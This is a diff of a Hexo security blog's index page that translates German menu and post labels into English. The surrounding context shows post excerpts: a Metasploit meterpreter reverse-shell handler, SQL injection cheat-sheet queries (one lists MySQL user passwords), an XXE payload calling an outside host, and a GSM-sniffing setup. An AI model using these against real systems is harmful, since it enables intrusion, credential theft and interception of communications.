@@ -175,7 +175,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -185,7 +185,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -208,7 +208,7 @@
             
               <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
-            Suche
+            Search
           </a>
         </li>
       
@@ -274,7 +274,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-21T11:19:54+08:00" content="2016-04-21">
               2016-04-21
             </time>
@@ -317,7 +317,7 @@
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/21/Install-beef-on-ubuntu14/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -380,7 +380,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-19T02:24:02+08:00" content="2016-04-19">
               2016-04-19
             </time>
@@ -420,7 +420,7 @@
           <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_tcp) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.100.10</span><br><span class="line">LHOST =&gt; 192.168.100.10</span><br><span class="line">msf exploit(handler) &gt; set LPORT 9876</span><br><span class="line">LPORT =&gt; 9876</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.100.10     yes       The listen address</span><br><span class="line">   LPORT     9876             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/19/meterpreter/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -483,7 +483,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-16T02:13:37+08:00" content="2016-04-16">
               2016-04-16
             </time>
@@ -524,7 +524,7 @@
 <h3 id="Install-Nginx-amp-amp-Openresty"><a href="#Install-Nginx-amp-amp-Openresty" class="headerlink" title="Install Nginx &amp;&amp; Openresty"></a>Install Nginx &amp;&amp; Openresty</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; yum install epel-release</span><br><span class="line">&gt; yum install nginx -y</span><br><span class="line">&gt; ./configure --with-http_sub_module --with-pcre-jit --with-ipv6 --add-module=/root/openresty/ngx_http_substitutions_filter_module --without-http_rewrite_module</span><br><span class="line">&gt; make &amp;&amp; make install</span><br><span class="line">&gt; /usr/local/openresty/nginx/sbin/nginx     #start nginx</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/16/Reverse-Proxy-Fishing/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -587,7 +587,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-14T10:35:56+08:00" content="2016-04-14">
               2016-04-14
             </time>
@@ -630,7 +630,7 @@
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/14/Proxychains-for-MAC-OSX-10-11-4/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -693,7 +693,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-14T02:53:16+08:00" content="2016-04-14">
               2016-04-14
             </time>
@@ -734,7 +734,7 @@
 <p>output：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;test1&quot;: 1, </span><br><span class="line">    &quot;test2&quot;: &quot;win&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/14/Commandline-JSON-Pretty-Print-everywhere/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -797,7 +797,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-11T20:20:57+08:00" content="2016-04-11">
               2016-04-11
             </time>
@@ -846,7 +846,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">True if MSSQL version is 2008.</span><br><span class="line">SELECT * FROM Users WHERE id = &apos;1&apos; AND @@VERSION LIKE &apos;%2008%&apos;;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/11/SQL-Injection-Cheat-Sheet-MSSQL/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -909,7 +909,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-04-11T00:45:14+08:00" content="2016-04-11">
               2016-04-11
             </time>
@@ -951,7 +951,7 @@
 <h3 id="User-details"><a href="#User-details" class="headerlink" title="User details"></a>User details</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT user()</span><br><span class="line">SELECT current_user()</span><br><span class="line">SELECT system_user()</span><br><span class="line">SELECT session_user()</span><br><span class="line">SELECT user,password FROM mysql.user;   # list Users</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1014,7 +1014,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-03-30T13:55:27+08:00" content="2016-03-30">
               2016-03-30
             </time>
@@ -1054,7 +1054,7 @@
           <h3 id="Vanilla-used-to-verify-outbound-xxe-or-blind-xxe"><a href="#Vanilla-used-to-verify-outbound-xxe-or-blind-xxe" class="headerlink" title="Vanilla, used to verify outbound xxe or blind xxe"></a>Vanilla, used to verify outbound xxe or blind xxe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http://x.x.x.x:443/test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;/r&gt;</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/30/XXE-Payloads/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1117,7 +1117,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-03-28T17:37:00+08:00" content="2016-03-28">
               2016-03-28
             </time>
@@ -1160,7 +1160,7 @@
 
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/28/Learn-Android-Security/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1223,7 +1223,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-03-17T13:09:07+08:00" content="2016-03-17">
               2016-03-17
             </time>
@@ -1263,7 +1263,7 @@
           <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; vim /etc/apt/sources.list</span><br><span class="line">&gt; deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">&gt; deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">&gt; deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line">&gt; apt-get update</span><br><span class="line">&gt; aptitude install libtool shtool autoconf git-core pkg-config make gcc</span><br><span class="line">&gt; apt-get install build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg  libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev libtalloc-dev synaptic</span><br><span class="line">&gt; mkdir osmocombb &amp;&amp; cd osmocombb</span><br><span class="line">&gt; wget -c http://bb.osmocom.org/trac/raw-attachment/wiki/GnuArmToolchain/gnu-arm-build.3.sh</span><br><span class="line">&gt; chmod +x gnu-arm-build.3.sh</span><br><span class="line">&gt; mkdir build install src</span><br><span class="line">&gt; cd src/</span><br><span class="line">&gt; wget http://ftp.gnu.org/gnu/gcc/gcc-4.8.2/gcc-4.8.2.tar.bz2</span><br><span class="line">&gt; wget http://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2</span><br><span class="line">&gt; wget ftp://sources.redhat.com/pub/newlib/newlib-1.19.0.tar.gz</span><br><span class="line">&gt; cd /root/osmocombb &amp;&amp; ./gnu-arm-build.3.sh</span><br><span class="line">&gt; export PATH=$PATH:/root/osmocombb/install/bin</span><br><span class="line">&gt; git clone git://git.osmocom.org/libosmocore.git &amp;&amp; cd libosmocore</span><br><span class="line">&gt; autoreconf -i</span><br><span class="line">&gt; ./configure</span><br><span class="line">&gt; make &amp;&amp; sudo make install</span><br><span class="line">&gt; cd .. &amp;&amp; sudo ldconfig</span><br><span class="line">&gt; git clone git://git.osmocom.org/osmocom-bb.git</span><br><span class="line">&gt; cd /root/osmocombb/osmocom-bb &amp;&amp; git checkout --track origin/luca/gsmmap</span><br><span class="line">&gt; cd src </span><br><span class="line">&gt; make</span><br><span class="line">&gt; cd ~/osmocombb/osmocom-bb/src/host/osmocon/ &amp;&amp; ./osmocon -m c123xor -p /dev/ttyUSB0 ../../target/firmware/board/compal_e88/layer1.compalram.bin    #此时需要按一下手机的红色关机键，等待手机出现Osmocom-bb系统</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/03/17/GSM-Hacking-With-SMS-Sniffer-for-Kali2/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
         
@@ -1338,7 +1338,7 @@
           <div class="site-state-item site-state-posts">
             <a href="/archives">
               <span class="site-state-item-count">45</span>
-              <span class="site-state-item-name">Artikel</span>
+              <span class="site-state-item-name">posts</span>
             </a>
           </div>
 
@@ -1348,7 +1348,7 @@
             <div class="site-state-item site-state-tags">
               <a href="/tags">
                 <span class="site-state-item-count">41</span>
-                <span class="site-state-item-name">Tags</span>
+                <span class="site-state-item-name">tags</span>
               </a>
             </div>
           
@@ -1441,7 +1441,7 @@
 </div>
 
 <div class="powered-by">
-  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
 </div>
 
 <div class="theme-info">
